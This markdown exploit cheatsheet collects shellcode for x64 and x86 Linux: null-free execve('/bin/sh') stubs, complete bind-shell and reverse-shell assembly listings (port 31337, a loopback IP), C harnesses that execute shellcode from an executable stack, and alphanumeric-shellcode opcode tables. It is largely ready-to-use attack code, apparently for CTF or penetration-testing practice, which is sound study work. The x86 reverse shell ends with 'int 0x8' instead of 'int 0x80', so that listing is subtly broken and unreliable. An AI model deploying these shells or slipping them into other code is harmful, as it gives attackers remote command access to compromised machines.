# Exploit-Cheatsheet

## Shellcode

### `x64`

#### Common techniques

* prevent null byte
    * Use existing values from registers/stack
        * e.g. if initially `rdi` is already 0, `xor rdi, rdi` becomes redundant
    * `xor rax, rax`: zero out `rax`, no null byte opcode
    * `mov rax, 0x30` → `push 0x30; pop rax`
    * `push 0x697a0002` → `push word 0x697a; push word 0x2`
* shorter opcode:
    * `cdq` (1 byte): zero out `rdx` if `rax >= 0`
    * `imul esi` (2 bytes): zero out `rdx` if `rsi == 0`
    * `push 0x30; pop rax` (3 bytes) → `mov al, 0x30`
    * `add eax, 1` (3 bytes), `inc rax` (3 bytes) → `inc eax` (2 bytes), `add al, 1` (2 bytes)
    * `xchg` (2 bytes)
* Caveats
    * if `eax == 0x000000ff`, then after `add al, 1`, `eax == 0x00000000`
        * use `inc ax`, `inc eax`, `inc rax` instead if you want `eax == 0x00000100`
    * `mov [m64], imm64` is not possible
        * e.g., `mov [rax], 0x68732f2f6e69622f` is not possible
        * Change to `mov rbx, 0x68732f2f6e69622f; mov [rax], rbx`

#### Example

* `execve("/bin/sh", NULL, NULL)` (Null Free, 22 Bytes)

```
xor esi, esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
imul esi
mov al, 0x3b
syscall
```

* Bind shell

```
; s = socket(2, 1, 0)
push 0x29
pop rax
cdq
push 0x2
pop rdi
push 0x1
pop rsi
syscall

; bind(s, [2, port, 0], 16)
xchg rax, rdi
mov al, 0x31
push rdx
push word 0x697a ; 31337
push word 0x2
push rsp
pop rsi
mov dl, 0x10
syscall

; listen(s, 0)
mov al, 0x32
xor esi, esi
syscall

; c = accept(s, 0, 0)
mov al, 0x2b
cdq
syscall

; dup2(c, {2,1,0});
xchg rax, rdi
mov esi, edi
loop:
mov al, 0x21
syscall
dec esi
jns loop

; execve("/bin/sh", 0, 0)
xor esi, esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
cdq
mov al, 0x3b
syscall
```

* Reverse shell

```
; s = socket(2, 1, 0)
push 0x29
pop rax
cdq
push 0x2
pop rdi
push 0x1
pop rsi
syscall

; connect(s, [2, port, ip], 16)
xchg rax, rdi
push 0x101017f ; ip
push word 0x697a ; port
push word 0x2
push rsp
pop rsi
mov dl, 0x10
mov al, 0x2a
syscall

; dup2(s, {2,1,0});
mov esi, edi
loop:
mov al, 0x21
syscall
dec esi
jns loop

; execve("/bin/sh", 0, 0)
xor esi, esi
push rsi
mov rbx,0x68732f2f6e69622f
push rbx
push rsp
pop rdi
cdq
mov al, 0x3b
syscall
```

### `x86`

* `execve("/bin/sh", NULL, NULL)`

```
xor eax, eax
xor ecx, ecx
cdq
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor al, 0xb
int 0x80
```

* Bind Shell

```
push 0x66
pop eax
push 0x1
pop ebx
xor esi, esi
push esi
push ebx
push 0x2
mov ecx, esp
int 0x80

pop edi
xchg edi, eax
xchg ebx, eax
mov al, 0x66
push esi
push 0x697a ; port 31337
push bx
mov ecx, esp
push 0x10
push ecx
push edi
mov ecx, esp
int 0x80

mov al, 0x66
mov bl, 0x4
push esi
push edi
mov ecx, esp
int 0x80
mov al, 0x66
inc ebx
push esi
push esi
push edi
mov ecx, esp
int 0x80

pop ecx
pop ecx
mov cl, 0x2
xchg ebx, eax
loop:
mov al, 0x3f
int 0x80

dec ecx
jns loop
mov al, 0xb
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
inc ecx
mov edx, ecx
int 0x80
```

* Reverse Shell

```
push 0x66
pop eax
cdq
xor ebx, ebx
inc ebx
push edx
push ebx
push 0x2
mov ecx, esp
int 0x80

pop ecx
xchg eax, ebx
loop:
mov al, 0x3f
int 0x80

dec ecx
jns loop
mov al, 0x66
push 0x101017f
push word 0x672b
push 0x2
mov ecx, esp
push 0x10
push ecx
push ebx
mov ecx, esp
int 0x80

mov al, 0xb
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
int 0x8
```

#### Shellcode Testing
* From string
Source (`sc.c`)
```c
int main() {
    char shellcode[] = ""; // shellcode
    int (*run)() = (int(*)())shellcode;
    run();
}
```
* From file
```c
#include <stdio.h>
#include <stdlib.h>
#define SHELLCODE_LENGTH 4096
int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "usage: ./shellcode_test [BINARY FILE]");
        exit(EXIT_FAILURE);
    }
    char shellcode[SHELLCODE_LENGTH]; // shellcode
    FILE *fp = fopen(argv[1], "rb");
    if (fp == NULL) {
        fprintf(stderr, "Cannot open file %s\n", argv[1]);
        exit(EXIT_FAILURE);
    }
    fread(shellcode, SHELLCODE_LENGTH, 1, fp);
    if (ferror(fp)) {
        fprintf(stderr, "Cannot read file %s\n", argv[1]);
        exit(EXIT_FAILURE);
    }
    int (*run)() = (int(*)())shellcode;
    run();
}
```
* Compile
```bash
gcc sc.c -z execstack -o sc
```

### Alphanumeric Shellcode

#### x64

* Prefixes
    <details>
    <summary>Expand</summary>

    | Opcode | Prefix Description | Example Instruction | Example Opcode |
    | - | - | - | - |
    | `f` | 16-bit operand size | `push rax` → `push ax` | `P` → `fP` |
    | `g` | 16-bit address size | `xor [rax], dh` → `xor [eax], dh` | `00` → `g00` |
    | `H` | 64-bit register size override | `xor eax, 0x30303030` → `xor rax, 0x30303030` | `50000` → `H50000` |
    | `6` | ss segment override | `xor [rcx+0x30], rax` → `xor [ss:rcx+0x30], rax` | `H1A0` →`6H1A0` |
    | `d` | fs segment override | `xor rax, [rcx+0x30]` → `xor rax, [fs:rcx+0x30]` | `H3A0` → `dH3A0` |
    | `e` | gs segment override | `xor rax, [rcx+0x30]` → `xor rax, [gs:rcx+0x30]` | `H3A0` → `eH3A0` |
    </details>
* Operands
    <details>
    <summary>Expand</summary>

    * Layer 1
        | Operand | Changed register | Changed Memory |
        | - | - | - |
        | `0` | `esi` | `[rax]` |
        | `1` | `esi` | `[rcx]` |
        | `2` | `esi` | `[rdx]` |
        | `3` | `esi` | `[rbx]` |
        | `4*` | `esi` | `[*]` |
        | `5####` | `esi` | `[rip + ####]` |
        | `6` | `esi` | `[rsi]` |
        | `7` | `esi` | `[rdi]` |
        | `8` | `edi` | `[rax]` |
        | `9` | `edi` | `[rcx]` |
        | `A#` | `eax` | `[rcx + #]` |
        | `B#` | `eax` | `[rdx + #]` |
        | `C#` | `eax` | `[rbx + #]` |
        | `D*#` | `eax` | `[* + #]` |
        | `E#` | `eax` | `[rbp + #]` |
        | `F#` | `eax` | `[rsi + #]` |
        | `G#` | `eax` | `[rdi + #]` |
        | `H#` | `ecx` | `[rax + #]` |
        | `I#` | `ecx` | `[rcx + #]` |
        | `J#` | `ecx` | `[rdx + #]` |
        | `K#` | `ecx` | `[rbx + #]` |
        | `L*#` | `ecx` | `[* + #]` |
        | `M#` | `ecx` | `[rbp + #]` |
        | `N#` | `ecx` | `[rsi + #]` |
        | `O#` | `ecx` | `[rdi + #]` |
        | `P#` | `edx` | `[rax + #]` |
        | `Q#` | `edx` | `[rcx + #]` |
        | `R#` | `edx` | `[rdx + #]` |
        | `S#` | `edx` | `[rbx + #]` |
        | `T*#` | `ecx` | `[* + #]` |
        | `U#` | `edx` | `[rbp + #]` |
        | `V#` | `edx` | `[rsi + #]` |
        | `W#` | `edx` | `[rdi + #]` |
        | `X#` | `ebx` | `[rax + #]` |
        | `Y#` | `ebx` | `[rcx + #]` |
        | `Z#` | `ebx` | `[rdx + #]` |
        | `a#` | `esp` | `[rcx + #]` |
        | `b#` | `esp` | `[rdx + #]` |
        | `c#` | `esp` | `[rbx + #]` |
        | `d*#` | `esp` | `[* + #]` |
        | `e#` | `esp` | `[rbp + #]` |
        | `f#` | `esp` | `[rsi + #]` |
        | `g#` | `esp` | `[rdi + #]` |
        | `h#` | `ebp` | `[rax + #]` |
        | `i#` | `ebp` | `[rcx + #]` |
        | `j#` | `ebp` | `[rdx + #]` |
        | `k#` | `ebp` | `[rbx + #]` |
        | `l*#` | `ebp` | `[* + #]` |
        | `m#` | `ebp` | `[rbp + #]` |
        | `n#` | `ebp` | `[rsi + #]` |
        | `o#` | `ebp` | `[rdi + #]` |
        | `p#` | `esi` | `[rax + #]` |
        | `q#` | `esi` | `[rcx + #]` |
        | `r#` | `esi` | `[rdx + #]` |
        | `s#` | `esi` | `[rbx + #]` |
        | `t*#` | `esi` | `[* + #]` |
        | `u#` | `esi` | `[rbp + #]` |
        | `v#` | `esi` | `[rsi + #]` |
        | `w#` | `esi` | `[rdi + #]` |
        | `x#` | `edi` | `[rax + #]` |
        | `y#` | `edi` | `[rcx + #]` |
        | `z#` | `edi` | `[rdx + #]` |
    * Layer 2
        | Operand | Changed register |
        | - | - |
        | `*0` | `rax + rsi` |
        | `*1` | `rcx + rsi` |
        | `*2` | `rdx + rsi` |
        | `*3` | `rbx + rsi` |
        | `*4` | `rsp + rsi` |
        | `*5` | `rbp + rsi` |
        | `*6` | `rsi + rsi` |
        | `*7` | `rdi + rsi` |
        | `*8` | `rax + rdi` |
        | `*9` | `rcx + rdi` |
        | `*A` | `rcx + rax*2` |
        | `*B` | `rdx + rax*2` |
        | `*C` | `rbx + rax*2` |
        | `*D` | `rsp + rax*2` |
        | `*E` | `rbp + rax*2` |
        | `*F` | `rsi + rax*2` |
        | `*G` | `rdi + rax*2` |
        | `*H` | `rax + rcx*2` |
        | `*I` | `rcx + rcx*2` |
        | `*J` | `rdx + rcx*2` |
        | `*K` | `rbx + rcx*2` |
        | `*L` | `rsp + rcx*2` |
        | `*M` | `rbp + rcx*2` |
        | `*N` | `rsi + rcx*2` |
        | `*O` | `rdi + rcx*2` |
        | `*P` | `rax + rdx*2` |
        | `*Q` | `rcx + rdx*2` |
        | `*R` | `rdx + rdx*2` |
        | `*S` | `rbx + rdx*2` |
        | `*T` | `rsp + rdx*2` |
        | `*U` | `rbp + rdx*2` |
        | `*V` | `rsi + rdx*2` |
        | `*W` | `rdi + rdx*2` |
        | `*X` | `rax + rbx*2` |
        | `*Y` | `rcx + rbx*2` |
        | `*Z` | `rdx + rbx*2` |
        | `*h` | `rax + rbp*2` |
        | `*i` | `rcx + rbp*2` |
        | `*j` | `rdx + rbp*2` |
        | `*k` | `rbx + rbp*2` |
        | `*l` | `rsp + rbp*2` |
        | `*m` | `rbp + rbp*2` |
        | `*n` | `rsi + rbp*2` |
        | `*o` | `rdi + rbp*2` |
        | `*p` | `rax + rsi*2` |
        | `*q` | `rcx + rsi*2` |
        | `*r` | `rdx + rsi*2` |
        | `*s` | `rbx + rsi*2` |
        | `*t` | `rsp + rsi*2` |
        | `*u` | `rbp + rsi*2` |
        | `*v` | `rsi + rsi*2` |
        | `*w` | `rdi + rsi*2` |
        | `*x` | `rax + rdi*2` |
        | `*y` | `rcx + rdi*2` |
        | `*z` | `rdx + rdi*2` |
    * Example
        | Instruction | Opcode |
        | - | - |
        | `xor byte ptr [rax], dh` | `00` |
        | `xor byte ptr [rax + rsi], dh` | `040` |
        | `xor byte ptr [rcx + 0x30], al` | `0A0` |
        | `xor byte ptr [rax + rsi + 0x30], al` | `0D00` |
        | `xor byte ptr [rcx + rax*2 + 0x30], al` | `0DA0` |
    </details>

* `push`
    | Instruction | Opcode | Instruction | Opcode |
    | - | - | - | - |
    | `push rax` | `P` | `push ax` | `fP` |
    | `push rcx` | `Q` | `push cx` | `fQ` |
    | `push rdx` | `R` | `push dx` | `fR` |
    | `push rbx` | `S` | `push bx` | `fS` |
    | `push rsp` | `T` | `push sp` | `fT` |
    | `push rbp` | `U` | `push bp` | `fU` |
    | `push rsi` | `V` | `push si` | `fV` |
    | `push rdi` | `W` | `push di` | `fW` |
    | `push r8` | `AP` | `push r8w` | `fAP` |
    | `push r9` | `AQ` | `push r9w` | `fAQ` |
    | `push r10` | `AR` | `push r10w` | `fAR` |
    | `push r11` | `AS` | `push r11w` | `fAS` |
    | `push r12` | `AT` | `push r12w` | `fAT` |
    | `push r13` | `AU` | `push r13w` | `fAU` |
    | `push r14` | `AV` | `push r14w` | `fAV` |
    | `push r15` | `AW` | `push r15w` | `fAW` |
    | `push byte 0x30 ` | `j0` |
    | `push word 0x3030` | `fh00` |
    | `push 0x30303030` | `h0000` |
* `pop`
    | Instruction | Opcode |
    | - | - |
    | `pop rax` | `X` | `pop ax` | `fX` |
    | `pop rcx` | `Y` | `pop cx` | `fY` |
    | `pop rdx` | `Z` | `pop dx` | `fZ` |
    | `pop r8` | `AX` | `pop r8w` | `fAX` |
    | `pop r9` | `AY` | `pop r9w` | `fAY` |
    | `pop r10` | `AZ` | `pop r10w` | `fAZ` |
* `xor`
    | Instruction | Opcode | Example Instruction | Example Opcode |
    | - | - | - | - |
    | `xor al, imm8` | `4#` | `xor al, 0x30` | `40` |
    | `xor ax, imm16` | `f5##` | `xor ax, 0x3030` | `f500` |
    | `xor eax, imm32` | `5####` | `xor eax, 0x30303030` | `50000` |
    | `xor rax, imm32` | `H5####` | `xor rax, 0x30303030` | `H50000` |
    | `xor m64, r8` | `0*` | `xor byte ptr [rcx + 0x30], al` | `0A0` |
    | `xor m64, r8` | `1*` | `xor dword ptr [rax + rsi + 0x30], eax` | `1D00` |
    | `xor r8, m64` | `2*` | `xor al, byte ptr [rcx + 0x4f]` | `2A0` |
    | `xor r8, m64` | `3*` | `xor dword ptr eax, [rax + rsi + 0x30]` | `3D00` |

* `imul`
    | Instruction | Opcode | Example Instruction | Example Opcode |
    | - | - | - | - |
    | `imul r32, m32, imm8` | `k?#` | `imul esi, dword ptr [rsi], 0x30` | `k60` |
    | `imul r32, m32, imm32` | `i?####` | `imul esi, dword ptr [rdx], 0x30303030` | `i20000` |

#### Reference
[x64 alphanumeric shellcode](https://nets.ec/Alphanumeric_shellcode)

### Resource

#### Opcode Table
[x86](https://shell-storm.org/x86doc/)
[x64](http://ref.x86asm.net/coder64.html)

#### Syscall Table
[syscall table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)

#### Database
[shell-storm shellcode database](https://shell-storm.org/shellcode/)
[exploit-db shellcodes](https://www.exploit-db.com/shellcodes)


